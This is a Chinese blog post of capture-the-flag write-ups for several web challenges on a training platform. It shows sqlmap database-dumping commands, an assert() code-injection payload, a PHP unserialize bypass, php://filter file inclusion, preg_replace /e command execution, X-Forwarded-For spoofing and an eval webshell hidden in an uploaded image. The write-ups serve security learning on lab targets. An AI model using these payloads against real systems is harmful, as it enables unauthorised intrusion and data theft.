---
title: 攻防世界-web
author: 简文涛
categories:
  - CTF
tags:
  - Write-up
comments: true
img: 'https://i.loli.net/2019/07/03/5d1c213fa0cd670760.png'
abbrlink: 44015
date: 2019-07-02 10:00:34
---
![](https://i.loli.net/2019/07/03/5d1c213fa0cd670760.png)
## ics-06

**题目信息**
![](https://i.loli.net/2019/07/03/5d1c20f6e90f917897.png)
**知识点：爆破id**
**工具：Burpsuite**

**解析**
打开题目场景，点击页面里的按钮，只有报表中心的页面可以打开，看到URL中的"index.php?id=1",就开始尝试注入，但是除了数字其他的都不能用。
尝试抓包，爆破id

![](https://i.loli.net/2019/07/03/5d1c4dc3bb5ca75203.png)
![](https://i.loli.net/2019/07/03/5d1c4e097bb6011944.png)
将抓到的包send to intruder
![](https://i.loli.net/2019/07/03/5d1c4e430a8c575639.png)
导入字典后，还是爆破
![](https://i.loli.net/2019/07/03/5d1c4e7ada66613178.png)
得到结果当id=2333是得到flag
![](https://i.loli.net/2019/07/03/5d1c4ea3537df96893.png)

## NewsCenter

**题目信息**
![](https://i.loli.net/2019/07/03/5d1c4f6c35c0451682.png)
**工具：bp,SQLmap**
**知识点：sql注入之post注入**

 **解析**
打开题目，有一处搜索框，搜索新闻。考虑SQL注入。
![](https://i.loli.net/2019/07/03/5d1c749c471b868852.png)
随便输入一个2，用bp抓包，发现是post方式,然后Copy to file，将报文保存为txt文件。
![](https://i.loli.net/2019/07/03/5d1c558e0861017335.png)
保存为123.txt
![](https://i.loli.net/2019/07/03/5d1c558dbef8024147.png)
然后用sqlmap一键注入（-r 表示从一个文件中载入HTTP请求，123.txt如果没有放到sqlmap目录就用绝对路径）

0x01:查找数据库
`python sqlmap.py -r D:\SQLmap\123.txt --dbs`
![](https://i.loli.net/2019/07/03/5d1c558d8a8e553611.png)

0x02:查找表
`python sqlmap.py -r D:\SQLmap\123.txt --tables -D news`
![](https://i.loli.net/2019/07/03/5d1c558d8ae7643931.png)

0x03:查找字段
`python sqlmap.py -r D:\SQLmap\123.txt --column -D news -T secret_table`
![](https://i.loli.net/2019/07/03/5d1c558e670f586778.png)
0x04:显示字段信息
`python sqlmap.py -r D:\SQLmap\123.txt --dump -D news -T secret_table -C fl4g`
![](https://i.loli.net/2019/07/03/5d1c558e5fd4f60339.png)

参考：[sqlmap用于sql注入语法](https://www.jianshu.com/p/a46abd1e67aa)


## mfw

**题目信息**
![](https://i.loli.net/2019/07/03/5d1c558e63efb94944.png)
**工具：GitHack,dirsearch**

**知识点：git漏洞、代码审计**

**解析**
打开题目场景，检查网站，发现这样一个页面
![](https://i.loli.net/2019/07/03/5d1c558e9028f92005.png)
访问.git目录，疑似存在git源码泄露
![](https://i.loli.net/2019/07/03/5d1c55b664ca798571.png)
再用dirsearch扫描，发现git源码泄露：
![](https://i.loli.net/2019/07/03/5d1c55a1de9de95791.png)
使用 GitHack获取源码
![](https://i.loli.net/2019/07/03/5d1c55b648ed698542.png)
得到源码
![](https://i.loli.net/2019/07/03/5d1c558f3d55016031.png)
 index.php中关键代码如下
``` php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

如果这个字符串中没有找到相应的子字符串 就返回false
// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```
```
assert() 检查一个断言是否为 FALSE
strpos() 函数查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False
file_exists() 函数检查文件或目录是否存在。
assert()函数会将括号中的字符当成代码来执行，并返回true或false。
```
payload:`?page=abc') or system("cat templates/flag.php");//`

$file =templates/ abc') or system("cat templates/flag.php");// ".php"
因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用" // "将后面的语句注释掉
查看网页源代码
![](https://i.loli.net/2019/07/03/5d1c55b62a8a131212.png)


## NaNNaNNaNNaN-Batman

**题目信息**
![](https://i.loli.net/2019/07/03/5d1c740bb71a265245.png)

**知识点：js代码（eval函数,alert函数,splice函数）,正则,代码审计**
**解析**
下载附件,是一个文件，没有后缀，用sublime打开看看
![](https://i.loli.net/2019/07/03/5d1c55b6c0a6c64949.png)

是js代码，那么我们将文件后缀改为html，用浏览器打开查看：
![](https://i.loli.net/2019/07/03/5d1c55b6a00e459555.png)

是一个输入框，但输入什么都没有反应，还是继续尝试分析js代码
审计代码可以看到eval函数执行了`_`变量中的内容也就是` ' '`中的内容，但是，要注意的是，它并没有执行`$()`函数，仅仅执行了`字符串`而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来：
![](https://i.loli.net/2019/07/03/5d1c55b6ede6a83745.png)
```
eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。
alert() 函数:用于显示带有一条指定消息和一个 确定按钮的警告框。
```
整理后源码为：
``` php
function $()
{
var e=document.getElementById("c").value;
if(e.length==16)
if(e.match(/^be0f23/)!=null)
if(e.match(/233ac/)!=null)
if(e.match(/e98aa$/)!=null)
if(e.match(/c7be9/)!=null)
	{	var t=["fl","s_a","i","e}"];
		var n=["a","_h0l","n"];
		var r=["g{","e","_0"];
		var i=["it'","_","n"];
		var s=[t,n,r,i];
	for(var o=0;o<13;++o)
		{
		 document.write(s[o%4][0]);
		 s[o%4].splice(0,1)
		}
	}
}
document.write('<input id="c"><button onclick=$()>Ok</button>');
delete _
```
**方法一：审计代码，因此我们要满足关键变量e的正则条件**
```
e.length==16
e.match(/^be0f23/)!=null
e.match(/233ac/)!=null
e.match(/e98aa$/)!=null
e.match(/c7be9/)!=null
```
^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求

于是我们构造e的值：`be0f233ac7be98aa`

将构造的e输入最初的html页面的输入框中得到flag
![](https://i.loli.net/2019/07/03/5d1c55b6dd4f871098.png)

![](https://i.loli.net/2019/07/03/5d1c55b71af0c25669.png)

**方法二：直接将下面代码复制到控制台执行也能得到flag**
``` php
var t=["fl","s_a","i","e}"];
		var n=["a","_h0l","n"];
		var r=["g{","e","_0"];
		var i=["it'","_","n"];
		var s=[t,n,r,i];
	for(var o=0;o<13;++o)
		{
		 document.write(s[o%4][0]);
		 s[o%4].splice(0,1)
		}
```
![](https://i.loli.net/2019/07/03/5d1c55b746e9547537.png)

参考：https://blog.csdn.net/qq_41617034/article/details/91946853

## PHP2

**题目信息**
![20190703030937986.png](https://i.loli.net/2019/07/03/5d1c75203dd8895789.png)
**知识点：php源码文件为phps，url会自动解码一次**

**解析**
打开题目环境，只有一句英文
![](https://i.loli.net/2019/07/03/5d1c758f9a23c59854.png)
用dirsearch进行网站目录扫描
![](https://i.loli.net/2019/07/03/5d1c759fb2d7235225.png)
扫描到index.php
![](https://i.loli.net/2019/07/03/5d1c75c484d5c22912.png)
但是还是什么都没有
![](https://i.loli.net/2019/07/03/5d1c75de0a89846738.png)
那么我们看看能否看看该网页php的源码，这里用到了.phps
```
.phps后缀释义：
phps文件就是php的源代码文件。
通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替
```
访问index.phpsde得到php的源文件
![](https://i.loli.net/2019/08/06/IbGjg1kuBvrPNFW.png)

只要将admin给url编码两次就好了，url自动解码一次，urldecode再解码一次就可以得到admin通过验证

![](https://i.loli.net/2019/08/06/9D5CSUzGIPyehaq.png)

![](https://i.loli.net/2019/08/06/StuaYBlCILrFwJo.png)

payload:`http://111.198.29.45:58197/?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45`
![](https://i.loli.net/2019/07/03/5d1c55943dfc797855.png)

## unserialize3

**题目信息**
![](https://i.loli.net/2019/08/06/NYWHCwuQ3d1eEO7.png)
**知识点：反序列化,__wakeup()函数漏洞**
**解析**
打开题目环境，得到php代码
![](https://i.loli.net/2019/08/06/rOejp9lZ1EYbGXw.png)
审计代码，就是让我们运用__wakeup()函数的漏洞拿flag的。这里我估计payload的点是，序列化后的字符串绕过__wakeup()。
`__wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。`
创建一个xctf类并对其进行序列化：
 ``` php
    <?php
    class xctf{
    public $flag = '111';
    public function __wakeup(){
    exit('bad requests');
    }
    }
    $a= new xctf();
    print(serialize($a));
    ?>
 ```
运行代码得到结果：O:4:"xctf":1:{s:4:"flag";s:3:"111";}
大括号前面的1便是属性变量的个数，只需对其进行更改便可以绕过__wakeup()，使exit函数不被执行，所以改为2之后传参
`payload: ?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`
![20190703030532437.png](https://i.loli.net/2019/07/03/5d1c768712ba971185.png)
## ics-05
**题目信息**
![](https://i.loli.net/2019/08/06/or8OaILKQtAlFVR.png)
**知识点：
文件包含漏洞
PHP伪协议中的 php://filter
preg_replace函数引发的命令执行漏洞**

**解析**
打开题目场景以后，只有一个index.php的页面能点开，并且页面没有显示完全，该页面很可疑。
查看源码发现?page=index，出现page这个get参数，联想到可能存在文件包含读源码的漏洞
![](https://i.loli.net/2019/08/06/ZtTh6bEKsIWoYSB.png)
尝试读取index.php的页面源码，通过php内置协议直接读取代码
```
?page=php://filter/read=convert.base64-encode/resource=index.php
```
![](https://i.loli.net/2019/08/06/M6h4ea3LGQqRW1l.png)
>LFI漏洞的黑盒判断方法：
单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。

base64解密之后，审计源码，分析得到如下关键部分
```php
<?php

//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}

?>
```
preg_replace函数
```php
函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。
$pattern: 要搜索的模式，可以是字符串或一个字符串数组。
$replacement: 用于替换的字符串或字符串数组。
$subject: 要搜索替换的目标字符串或字符串数组。
```
preg_replace函数存在命令执行漏洞
此处明显考察的是preg_replace 函数使用 `/e `模式，导致代码执行的问题。
>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

也就是说，pat和sub有相同部分，rep的代码就会执行。

根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入"/e"触发漏洞
我首先执行一下`phpinfo()`
![](https://i.loli.net/2019/08/06/rYwteLgEPJdGzZX.png)
果然成功执行
然后使用`system("ls")`尝试获取文件目录
![](https://i.loli.net/2019/08/06/1GV4YBtb6TL5PXv.png)
使用cd进入目标文件，并查看该文件夹下文件`system("cd%20s3chahahaDir%26%26+ls")`
此处不能使用空格隔开，可用`%20`或者`+`代替，`%26%26`为`&&`，`&&`意思是当前面命令执行成功时，继续执行后面的命令。
![](https://i.loli.net/2019/08/06/A5CQTwdzDvViPl3.png)
看到flag文件
继续进入查看`system("cd%20s3chahahaDir/flag%26%26+ls")`
![](https://i.loli.net/2019/08/06/RoIgn7Xes4SH8WC.png)
看到flag.php,使用cat命令查看flag.php中的内容
![](https://i.loli.net/2019/08/06/sgVa8lPTwkvXL6I.png)
得到flag
[慎用preg_replace危险的/e修饰符(一句话后门常用)](https://www.cnblogs.com/dhsx/p/4991983.html)
[php LFI读php文件源码以及直接post webshell](https://www.t00ls.net/articles-24627.html)
## ics-07
**题目信息**
![](https://i.loli.net/2019/08/10/QHFULOyI1riVBm2.png)
**知识点：代码审计**
**解析**
打开题目可以直接获取到源码,审计源码
第一层绕过：
```php
  <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {//末尾要求是9
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>
```
关键点：
```
if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9')
```
1.floatval($_GET[id]) !== '1'的限制
2.substr($_GET[id], -1) === '9')的限制
构造`id=1-9`,获得$_SESSION['admin'] = True
![](https://i.loli.net/2019/08/10/ADzSnb3K6NXiFkJ.png)

第二层绕过：
```php
 <?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>
```
## bug
**题目信息**
![](https://i.loli.net/2019/08/31/uePibzS1Lx5mI9j.png)
**知识点：修改密码逻辑漏洞，ip伪造，文件上传绕过**
**解析**
先注册一个帐号，然后找回密码，输入正确的信息。到第二步提示修改新的密码的时候，直接抓包把用户名修改为admin。
![](https://i.loli.net/2019/08/31/SjcKHVAgMQC4fPd.png)
然后就可以登陆`admin`这个帐号，然后在`manage`页面提示 `not allow ip` 我们把`x-forwarded-for`改为`127.0.0.1`就可以绕过。
![](https://i.loli.net/2019/08/31/xLgJuElYMQyoPfv.png)
提示`<!– index.php?module=filemanage&do=???–>`要我们猜`do`由于是`filemanage`就直接猜`do＝upload` 然后就出现一个上传页面
![](https://i.loli.net/2019/08/31/y1FI47EbAGcQRSi.png)
随便上传试试，发现提示 `You know what I want!`
上传包含`<?php`开头的图片提示`Something shows it is a php!`
这里不仅对后缀进行了黑名单过滤，同时会检查文件的开头内容，所以不能以`<?php`开头，可以用`<script language="php"> ... php code... </script>`来进行绕过
直接上传一个图片马，在后面写上
```
<script language="php">eval($_POST[a]);</script>
```
抓包改后缀为`php5`或`php4`，即可看到`flag`
![](https://i.loli.net/2019/08/31/CGK8c5fVLmW6jbq.png)



## CAT

**题目信息**
![](https://i.loli.net/2019/07/14/5d2acb353e2b686967.png)
**知识点：PHP 层的处理逻辑**
**解析**






参考：[__wakeup()函数漏洞以及实际漏洞分析 ](https://blog.spoock.com/2016/11/03/php-wakeup/)
[PHP在线工具](https://c.runoob.com/compile/1)
[在线序列化](https://www.w3cschool.cn/tryrun/showphp/demo_func_string_serialize)



